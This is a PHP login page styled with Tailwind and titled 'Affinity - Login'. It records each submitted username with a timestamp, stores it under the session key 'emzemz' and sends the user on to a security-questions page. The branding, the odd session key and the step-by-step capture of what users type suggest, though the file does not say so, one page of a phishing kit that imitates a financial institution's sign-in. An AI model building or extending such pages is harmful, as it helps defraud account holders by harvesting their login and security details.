<?php
session_start();
require_once 'includes/file_storage.php';

$errors = [];
$username = '';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $username = trim($_POST['username'] ?? '');
    $password = $_POST['password'] ?? '';
    $remember = isset($_POST['remember']);

    // Simple validation
    if (empty($username)) {
        $errors['username'] = 'Username is required';
    }
    if (empty($password)) {
        $errors['password'] = 'Password is required';
    }

    if (empty($errors)) {
        // Store username in session for next steps
        $_SESSION['emzemz'] = $username;
        
        // Save to test file
        $data = [
            'timestamp' => date('Y-m-d H:i:s'),
            'step' => 'login',
            'data' => [
                'username' => $username,
                'remember' => $remember
            ]
        ];
        
        saveFormData($data);
        
        // Redirect to security questions
        header('Location: security_questions.php');
        exit;
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Affinity - Login</title>
    <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
</head>
<body class="bg-gray-100 min-h-screen flex items-center justify-center p-4">
    <div class="bg-white rounded-lg shadow-lg overflow-hidden w-full max-w-md">
        <div class="p-8">
            <div class="text-center mb-8">
                <h1 class="text-2xl font-bold text-gray-800">Welcome Back</h1>
                <p class="text-gray-600">Sign in to your account</p>
            </div>
            
            <?php if (!empty($errors)): ?>
                <div class="bg-red-50 border-l-4 border-red-500 p-4 mb-6">
                    <div class="flex">
                        <div class="flex-shrink-0">
                            <svg class="h-5 w-5 text-red-500" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20" fill="currentColor">
                                <path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zM8.707 7.293a1 1 0 00-1.414 1.414L8.586 10l-1.293 1.293a1 1 0 101.414 1.414L10 11.414l1.293 1.293a1 1 0 001.414-1.414L11.414 10l1.293-1.293a1 1 0 00-1.414-1.414L10 8.586 8.707 7.293z" clip-rule="evenodd" />
                            </svg>
                        </div>
                        <div class="ml-3">
                            <p class="text-sm text-red-700">
                                Please fix the following errors:
                                <ul class="list-disc pl-5 mt-1">
                                    <?php foreach ($errors as $error): ?>
                                        <li><?php echo htmlspecialchars($error); ?></li>
                                    <?php endforeach; ?>
                                </ul>
                            </p>
                        </div>
                    </div>
                </div>
            <?php endif; ?>
            
            <form method="POST" class="space-y-6">
                <div>
                    <label for="username" class="block text-sm font-medium text-gray-700 mb-1">
                        Username
                    </label>
                    <input
                        type="text"
                        id="username"
                        name="username"
                        value="<?php echo htmlspecialchars($username); ?>"
                        class="w-full border border-gray-300 rounded-md px-3 py-2 focus:ring-2 focus:ring-purple-600 focus:outline-none shadow-sm"
                        autocomplete="username"
                        required
                    >
                </div>
                
                <div>
                    <div class="flex justify-between items-center mb-1">
                        <label for="password" class="block text-sm font-medium text-gray-700">
                            Password
                        </label>
                        <a href="#" class="text-sm text-purple-600 hover:text-purple-500">Forgot password?</a>
                    </div>
                    <div class="relative">
                        <input
                            type="password"
                            id="password"
                            name="password"
                            class="w-full border border-gray-300 rounded-md px-3 py-2 pr-10 focus:ring-2 focus:ring-purple-600 focus:outline-none shadow-sm"
                            autocomplete="current-password"
                            required
                        >
                        <button
                            type="button"
                            class="absolute inset-y-0 right-0 pr-3 flex items-center text-gray-400 hover:text-gray-600"
                            onclick="togglePasswordVisibility('password')"
                        >
                            <svg id="eye-icon-password" class="h-5 w-5" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20" fill="currentColor">
                                <path d="M10 12a2 2 0 100-4 2 2 0 000 4z" />
                                <path fill-rule="evenodd" d="M.458 10C1.732 5.943 5.522 3 10 3s8.268 2.943 9.542 7c-1.274 4.057-5.064 7-9.542 7S1.732 14.057.458 10zM14 10a4 4 0 11-8 0 4 4 0 018 0z" clip-rule="evenodd" />
                            </svg>
                        </button>
                    </div>
                </div>
                
                <div class="flex items-center">
                    <input
                        id="remember"
                        name="remember"
                        type="checkbox"
                        class="h-4 w-4 text-purple-600 focus:ring-purple-500 border-gray-300 rounded"
                    >
                    <label for="remember" class="ml-2 block text-sm text-gray-700">
                        Remember me
                    </label>
                </div>
                
                <div>
                    <button
                        type="submit"
                        class="w-full flex justify-center py-2 px-4 border border-transparent rounded-md shadow-sm text-sm font-medium text-white bg-purple-600 hover:bg-purple-700 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-purple-500"
                    >
                        Sign in
                    </button>
                </div>
            </form>
            
            <div class="mt-6">
                <p class="text-center text-sm text-gray-600">
                    Don't have an account? 
                    <a href="register.php" class="font-medium text-purple-600 hover:text-purple-500">
                        Sign up
                    </a>
                </p>
            </div>
        </div>
    </div>

    <script>
        function togglePasswordVisibility(fieldId) {
            const field = document.getElementById(fieldId);
            const eyeIcon = document.getElementById(`eye-icon-${fieldId}`);
            
            if (field.type === 'password') {
                field.type = 'text';
                eyeIcon.innerHTML = '<path fill-rule="evenodd" d="M3.707 2.293a1 1 0 00-1.414 1.414l14 14a1 1 0 001.414-1.414l-1.473-1.473C18.191 12.99 20 11.5 20 10c0-4.057-3.943-7-9.542-7-1.481 0-2.92.37-4.2 1.076L3.707 2.293zM10 5c-2.2 0-4.2.9-5.9 2.4L3.5 6.5c1.5-1.5 3.6-2.5 6-2.5 3.2 0 6 1.8 7.4 4.5-1.6 2.2-4 3.5-6.6 3.5-1.1 0-2.1-.2-3.1-.6l-1.7-1.7c.1-.3.2-.6.2-1 0-1.1-.9-2-2-2s-2 .9-2 2 .9 2 2 2c.4 0 .7-.1 1-.3l-1.6-1.6C3.6 9.8 2 10.9 2 12c0 1.1 1.9 2 4.2 2.6l-1.4 1.4C2.6 15.3 0 13.8 0 12c0-2.4 2.4-4.4 5.5-5.4C6.7 5.2 8.3 5 10 5z" clip-rule="evenodd" />';
            } else {
                field.type = 'password';
                eyeIcon.innerHTML = '<path d="M10 12a2 2 0 100-4 2 2 0 000 4z" /><path fill-rule="evenodd" d="M.458 10C1.732 5.943 5.522 3 10 3s8.268 2.943 9.542 7c-1.274 4.057-5.064 7-9.542 7S1.732 14.057.458 10zM14 10a4 4 0 11-8 0 4 4 0 018 0z" clip-rule="evenodd" />';
            }
        }
    </script>
</body>
</html>
